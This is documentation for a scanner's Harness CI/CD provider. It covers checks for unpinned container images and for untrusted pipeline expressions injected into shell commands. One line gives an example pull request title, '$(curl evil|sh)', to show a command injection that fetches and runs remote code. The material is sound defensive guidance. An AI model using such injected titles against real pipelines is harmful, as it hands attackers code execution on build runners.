# Harness CI/CD provider

Parses Harness pipeline YAML (the Git Experience / pipeline-as-code
form) on disk. Harness has no canonical filename, so the loader globs
``*.yml`` / ``*.yaml`` and keeps the documents whose top-level key is
``pipeline:`` (its discriminator); a ``template:`` document or
unrelated YAML in the same directory is skipped. A pipeline nests
steps several levels deep (``stages`` -> ``stage.spec.execution.steps``
-> ``step`` / ``parallel`` / ``stepGroup``); the rule pack flattens
all of that and scans every leaf step across CI and CD stages.

## Producer workflow

```bash
# --harness-path is auto-detected when a .harness/ directory exists at cwd.
pipeline_check --pipeline harness

# ...or pass it explicitly (a file or a directory of pipelines).
pipeline_check --pipeline harness --harness-path .harness/

pipeline_check --pipeline harness --harness-path pipelines/build.yaml
```

All other flags (`--output`, `--severity-threshold`, `--checks`,
`--standard`, ...) behave the same as with the other providers.

### Harness-specific checks

- **HARNESS-002**, Harness substitutes a ``<+...>`` expression's text
  into a step ``command`` *before* the shell runs it, so an
  attacker-controllable expression (``<+codebase.prTitle>``,
  ``<+codebase.commitMessage>``, a branch / tag name, or any
  ``<+trigger.*>`` / ``<+eventPayload.*>`` value) is a command-injection
  primitive. ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are
  excluded (not injectable text). Bind the value to an ``envVariables``
  entry and quote it (``"$PR_TITLE"``) to clear the finding. Same model
  as GHA-002 / GL-002 / DR-003 in this catalog.

## What it covers

2 checks · 0 have an autofix patch (``--fix``).

| Check | Title | Severity | Fix |
|-------|-------|----------|-----|
| [HARNESS-001](#harness-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-002](#harness-002) | Untrusted Harness expression interpolated into a step command | <span class="pg-sev pg-sev--high">HIGH</span> |  |

---

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-001: Step image not pinned to a digest { #harness-001 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Detection mirrors the DR-001 / GL-001 / CC-003 family over Harness's nested step model: every ``Run`` / ``Plugin`` / ``Background`` (and any custom) step that declares a ``spec.image`` whose ref does not end in ``@sha256:<64 hex>`` fires, across CI and CD stages and through ``parallel`` / ``stepGroup`` nesting. Steps with no ``spec.image`` (built-in steps like ``BuildAndPushDockerRegistry`` / ``RestoreCacheS3``) pass-by-default. ``:latest`` and missing-tag refs emit the strongest message; a version tag (``node:18.19.0``) still fires but is a one-line digest swap.

**Known false-positive modes**

- An image built earlier in the same pipeline and referenced by a deliberately-floating internal tag can't always be digest-pinned. Suppress via an ignore-file scoped to that step; the floating-tag risk still applies to every public-registry pull.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every step ``image:`` to ``@sha256:<digest>``. Harness resolves the image ref at run time, so a tag like ``node:18`` resolves against whatever the registry currently serves, and a compromised registry (or a moved tag) can swap content under a fixed tag. Capture the digest once with ``crane digest node:18`` (or ``docker buildx imagetools inspect node:18``) and bump it deliberately when the upstream version moves.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-002: Untrusted Harness expression interpolated into a step command { #harness-002 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

The Harness analog of GHA-002 / GL-002 script injection. Fires when a step's ``spec.command`` text contains a ``<+...>`` expression that resolves to outside-contributor input: the ``codebase`` identity / ref / title / message fields (``gitUser``, ``branch``, ``sourceBranch``, ``targetBranch``, ``tag``, ``prTitle``, ``commitMessage``, ...) or the whole ``trigger.`` / ``eventPayload.`` webhook context. ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are excluded (not injectable text). Detection is purely on the expression namespace, so it does not depend on the trigger type; binding the value to an env var and quoting it clears the finding.

<div class="pg-rule__rec" markdown>

**Recommended action**

Never paste an attacker-controllable Harness expression (``<+codebase.prTitle>``, ``<+codebase.commitMessage>``, a branch / tag name, or any ``<+trigger.*>`` / ``<+eventPayload.*>`` value) straight into a ``Run`` step ``command``. Harness substitutes the expression's text into the script before the shell runs it, so a pull request titled ``$(curl evil|sh)`` executes on your runner. Pass the value through an environment variable instead (``envVariables: { PR_TITLE: <+codebase.prTitle> }`` then use ``"$PR_TITLE"`` quoted in the script), which makes the shell treat it as data, not code.

</div>

</div>

---

## Adding a new Harness CI/CD check

1. Create a new module at
   `pipeline_check/core/checks/harness/rules/NNN_<name>.py`
   exporting a top-level `RULE = Rule(...)` and a `check(path, doc) -> Finding`
   function. The orchestrator auto-discovers `RULE` and calls `check`
   with the parsed YAML document.
2. Add a mapping for the new ID in
   `pipeline_check/core/standards/data/owasp_cicd_top_10.py` (and any
   other standard that applies).
3. Drop unsafe/safe snippets at
   `tests/fixtures/per_check/harness/-NNN.{unsafe,safe}.yml`
   and add a `CheckCase` entry in
   `tests/test_per_check_real_examples.py::CASES`.
4. Regenerate this doc:

   ```bash
   python scripts/gen_provider_docs.py harness
   ```
